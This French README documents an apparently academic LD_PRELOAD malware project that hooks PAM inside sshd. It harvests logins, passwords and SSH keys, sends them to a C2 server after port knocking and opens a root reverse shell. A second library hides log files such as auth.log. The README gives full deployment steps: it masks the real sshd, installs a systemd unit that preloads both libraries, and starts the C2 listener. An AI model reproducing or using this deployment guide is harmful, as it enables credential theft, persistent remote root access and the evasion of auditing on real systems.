# Projet Malware LD_PRELOAD

## Introduction

Ce projet a pour objectif de démontrer comment utiliser un malware avec la technique LD_PRELOAD pour intercepter et modifier le comportement d'un serveur SSH. En surchargeant certaines fonctions critiques (via des bibliothèques partagées), le malware extrait les identifiants (login et mot de passe) et les clés SSH de la victime. De plus, un mécanisme de port knocking permet de signaler au serveur de Commande & Contrôle (C2) qu'une séquence d'accès est validée, déclenchant ainsi l'ouverture d'un reverse shell pour un accès interactif. Enfin, une bibliothèque complémentaire bloque l'accès à certains fichiers sensibles pour empêcher leur lecture par l'utilisateur.

## Fonctionnalités

### Interception des Credentials et copie des clés SSH

Utilisation des fonctions PAM via LD_PRELOAD afin d'extraire le login, le mot de passe de l'utilisateur. Utilisation de getpwnam() pour déterminer dynamiquement le répertoire personnel de l'utilisateur afin de lire les clés depuis le dossier ~/.ssh.

### Port Knocking

Envoi de trois connexions TCP successives sur des ports prédéfinis avec un délai entre chaque appel, permettant au C2 de détecter et d'ouvrir les services de réception.

### Reverse Shell

Lancement d'un shell interactif (via forkpty()) qui redirige son entrée/sortie sur une connexion TCP vers le C2.

### Blocage de Fichiers Sensibles

Appel des fonctions d’accès aux fichiers (open(), openat(), fopen()) pour empêcher l’accès à des fichiers critiques ou contenant des logs (ex. /var/log/auth.log).

## Structure du Projet

pam_auth_logger.c  
Cette bibliothèque partagée, injectée via LD_PRELOAD, intercepte les fonctions PAM pour récupérer les credentials et les clés SSH. Elle effectue ensuite le port knocking, envoie un fichier contenant les informations exfiltrées au C2 et lance un reverse shell.

block_files.c  
Bibliothèque partagée également injectée via LD_PRELOAD, qui surcharge les fonctions d'accès aux fichiers pour bloquer l'accès à certains fichiers.

c2 (serveur de Commande & Contrôle)  
Le serveur C2 est configuré pour surveiller les ports de port knocking, recevoir le fichier credentials.txt et accepter les connexions du reverse shell.

## Installation et Utilisation

### Pré-requis

```sh
sudo apt install -y build-essential libpam0g-dev openssh-server
```

### Compilation

Cloner le projet et compiler :

```sh
git clone https://github.com/snipzr/Partiel_C.git
cd Partiel_C
```

Pour le compiler sur la victime :

```sh
make clean && make
```

Pour compiler le C2 (dans Partiel_C, allez dans le dossier C2) :

```sh
gcc -o c2 c2.c
```

Modifiez les ports utilisés si vous le souhaitez :  
Sur le C2 dans le fichier c2, lignes 11 à 16  
Modifiez avec les mêmes ports dans pam_auth_logger.c (lignes 34 à 38). Mais surtout n'oubliez pas de changer l'adresse IP du C2 (ligne 33) sinon ça ne fonctionnera pas.

## Déploiement sur la Machine Victime

Arrêter le service SSH existant :

```sh
sudo systemctl stop sshd
sudo systemctl disable sshd
sudo systemctl mask sshd
```

On va créer un service qui charge automatiquement LD_PRELOAD au démarrage.

```sh
vim /etc/systemd/system/ld_preload_sshd.service
```

On va y coller le contenu suivant :

```
[Unit]
Description=SSH Daemon with LD_PRELOAD
After=network.target

[Service]
Environment="LD_PRELOAD=/chemin/vers/libpam_auth_logger.so:/chemin/vers/block_files.so"
ExecStart=/usr/sbin/sshd -D
Restart=on-failure
RestartSec=5s
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

Appliquer et démarrer le service :

```sh
sudo systemctl daemon-reload
sudo systemctl enable ld_preload_sshd
sudo systemctl start ld_preload_sshd
```

## Déploiement sur le Serveur C2

Lancez l'écoute grâce à la commande :

```sh
./c2
```

## Connexion SSH

Connectez-vous en SSH à la machine victime depuis une autre machine. Cette connexion déclenchera :  
L'interception et l'écriture du login, du mot de passe et la copie des clés SSH dans /tmp/credentials.txt. Le port knocking et l'envoi du fichier au C2 sous le nom de credentials_<IP_victime>. Le lancement d'un reverse shell en root vers le C2.

## Explications Techniques

### Fonctionnement du Linker et de LD_PRELOAD

Le linker dynamique (ld.so) est chargé au démarrage d'un programme de lier dynamiquement les bibliothèques partagées. La variable d'environnement LD_PRELOAD permet d'indiquer au linker de charger, en priorité, une ou plusieurs bibliothèques spécifiées avant les bibliothèques système.

### Fonctionnement des Threads sur Linux

Un thread est une unité d'exécution légère au sein d'un processus qui partage le même espace mémoire que les autres threads du même processus. Dans notre serveur C2, les threads sont utilisés pour écouter simultanément sur plusieurs ports (port knocking, réception des credentials, reverse shell).

## Conclusion

Ce projet démontre comment combiner LD_PRELOAD, l'injection de bibliothèques personnalisées et l'utilisation de threads pour intercepter et exfiltrer discrètement des informations sensibles, tout en bloquant l'accès à certains fichiers critiques.


